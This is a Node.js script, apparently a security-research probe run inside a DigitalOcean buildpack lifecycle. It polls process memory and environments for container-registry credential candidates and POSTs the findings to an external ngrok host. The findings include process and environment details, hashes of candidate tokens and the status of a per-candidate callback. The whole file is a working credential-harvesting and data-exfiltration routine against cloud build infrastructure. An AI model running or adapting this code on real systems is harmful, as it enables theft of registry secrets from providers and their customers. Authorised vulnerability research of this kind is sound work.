import crypto from 'node:crypto';
import { setTimeout as delay } from 'node:timers/promises';
import { scanLifecycleMemory } from './lifecycle-memory-scan.mjs';

const MAX_DURATION_MS = 44_000;
const POLL_INTERVAL_MS = 8_000;
const MAX_BYTES_PER_SCAN = 8 * 1024 * 1024;
const MAX_REGION_BYTES = 2 * 1024 * 1024;
const sha256 = (value) => crypto.createHash('sha256').update(value ?? '').digest('hex');

const postStatus = async (payload) => {
  const callbackBase = process.env.LAB_LIFECYCLE_TOKEN_CALLBACK_URL || '';
  const callbackSecret = process.env.LAB_LIFECYCLE_TOKEN_CALLBACK_SECRET || '';
  if (!callbackBase || !callbackSecret) return { configured: false, attempted: false, accepted: false };
  try {
    const url = new URL(callbackBase);
    if (url.protocol !== 'https:' || !url.hostname.endsWith('.ngrok-free.app')) throw new Error('callback-not-allowlisted');
    url.pathname = '/digitalocean-lifecycle-watch';
    url.search = '';
    url.hash = '';
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-lab-secret': callbackSecret },
      body: JSON.stringify(payload),
      redirect: 'manual',
      signal: AbortSignal.timeout(5000),
    });
    return { configured: true, attempted: true, accepted: response.status >= 200 && response.status < 300, status: response.status };
  } catch (error) {
    return { configured: true, attempted: true, accepted: false, error: error.name === 'TimeoutError' ? 'timeout' : String(error.message || error.code || error.name) };
  }
};

const startedAt = Date.now();
const callbackHashes = new Set();
const snapshots = [];
let totalBytesRead = 0;
let totalEnvironmentBytesRead = 0;
await postStatus({
  schema: 1,
  marker: 'DO_CNB_LIFECYCLE_WATCH_V1',
  phase: 'started',
  startedAt: new Date(startedAt).toISOString(),
  observedAt: new Date().toISOString(),
  waitedMilliseconds: 0,
  totalBytesRead: 0,
  totalEnvironmentBytesRead: 0,
  rawMemoryPersisted: false,
  rawEnvironmentPersisted: false,
  rawCredentialLogged: false,
});

while (Date.now() - startedAt < MAX_DURATION_MS) {
  await delay(POLL_INTERVAL_MS);
  const scan = await scanLifecycleMemory({
    maxTotalBytes: MAX_BYTES_PER_SCAN,
    maxRegionBytes: MAX_REGION_BYTES,
    callbackHashes,
    enableCallback: true,
    includeRuntimeMetadata: false,
  });
  totalBytesRead += scan.totalBytesRead;
  totalEnvironmentBytesRead += scan.totalEnvironmentBytesRead;
  snapshots.push({
    observedAt: new Date().toISOString(),
    targetCount: scan.targetCount,
    processSignatures: scan.processes.map((entry) => ({
      pid: entry.pid,
      comm: entry.comm,
      executableBasename: entry.executableBasename,
      environmentReadable: entry.environmentReadable,
      interestingEnvironment: entry.interestingEnvironment,
      mapsReadable: entry.mapsReadable,
      memoryReadable: entry.memoryReadable,
    })),
    registryHostOccurrences: scan.registryHostOccurrences,
    candidateHashes: scan.registryCredentialCandidates.map((entry) => entry.tokenSha256),
    callbackAccepted: scan.registryCredentialCandidates.some((entry) => entry.callback.accepted),
    bytesRead: scan.totalBytesRead,
    environmentBytesRead: scan.totalEnvironmentBytesRead,
  });
}

await postStatus({
  schema: 1,
  marker: 'DO_CNB_LIFECYCLE_WATCH_V1',
  phase: 'completed',
  startedAt: new Date(startedAt).toISOString(),
  observedAt: new Date().toISOString(),
  waitedMilliseconds: Date.now() - startedAt,
  totalBytesRead,
  totalEnvironmentBytesRead,
  snapshotCount: snapshots.length,
  processSignatureSetSha256: sha256(JSON.stringify(snapshots.flatMap((entry) => entry.processSignatures))),
  processEnvironmentCatalog: [...new Map(snapshots.flatMap((entry) => entry.processSignatures).map((entry) => [
    JSON.stringify({
      pid: entry.pid,
      comm: entry.comm,
      executableBasename: entry.executableBasename,
      interestingEnvironment: entry.interestingEnvironment,
    }),
    entry,
  ])).values()].slice(0, 64),
  maximumTargetCount: Math.max(0, ...snapshots.map((entry) => entry.targetCount)),
  registryHostOccurrences: snapshots.reduce((sum, entry) => sum + entry.registryHostOccurrences, 0),
  registryCredentialCandidateHashes: [...new Set(snapshots.flatMap((entry) => entry.candidateHashes))],
  registryCredentialCallbackAccepted: snapshots.some((entry) => entry.callbackAccepted),
  rawMemoryPersisted: false,
  rawEnvironmentPersisted: false,
  rawCredentialLogged: false,
});
